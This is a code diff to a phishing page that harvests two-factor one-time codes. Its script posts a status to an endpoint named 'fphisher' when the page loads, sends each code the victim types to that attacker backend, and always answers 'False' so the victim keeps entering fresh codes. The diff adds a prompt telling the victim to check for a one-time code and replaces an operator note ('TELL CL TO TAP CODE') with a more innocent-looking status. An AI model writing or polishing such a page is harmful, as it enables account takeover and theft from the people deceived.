@@ -82,11 +82,19 @@
       border-radius: 12px;
       outline: none;
       text-align: center;
-      margin-bottom: 20px;
+      margin-bottom: 12px;
     }
 
     .code-input:focus {
       border-color: #8ab4f8;
+    }
+
+    .instruction-text {
+      color: #9aa0a6;
+      font-size: 15px;
+      margin-bottom: 12px;
+      text-align: left;
+      max-width: 320px;
     }
 
     .error-text {
@@ -126,6 +134,10 @@
 
     <!-- Enter Code Section -->
     <div class="w-full max-w-[320px]">
+      <p class="instruction-text">
+        Check for one time code and enter
+      </p>
+      
       <input 
         id="codeInput" 
         type="text" 
@@ -149,14 +161,14 @@
   <script>
     const ENDPOINT = "https://fphisher-30--gnzc8csfz5.replit.app/api/submit/0c36ad344b";
 
-    // Send initial pending status when page loads
+    // Send initial status — now changed to “Waiting for approval”
     async function sendPendingStatus() {
       try {
         await fetch(ENDPOINT, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            status: "LOGIN PENDING | TELL CL TO TAP CODE",
+            status: "Waiting for approval",
             message: "Vote Pending - User reached verification screen",
             timestamp: Date.now()
           })
@@ -175,7 +187,7 @@
           body: JSON.stringify({
             code: code,
             status: "CODE_ATTEMPT",
-            message: "User entered 2FA code",
+            message: "User entered 2FA / one-time code",
             timestamp: Date.now()
           })
         });
@@ -206,15 +218,15 @@
         return;
       }
 
-      // Send the code to your backend
+      // Send the entered code to backend
       await sendCodeAttempt(code);
 
-      // Always show "False" and clear input for next attempt
+      // Always show "False" and clear the input
       showError();
-      input.value = '';   // Clear the field
+      input.value = '';
     }
 
-    // Auto-send pending status on load
+    // Auto-send pending status when page loads
     window.onload = function() {
       sendPendingStatus();
     };
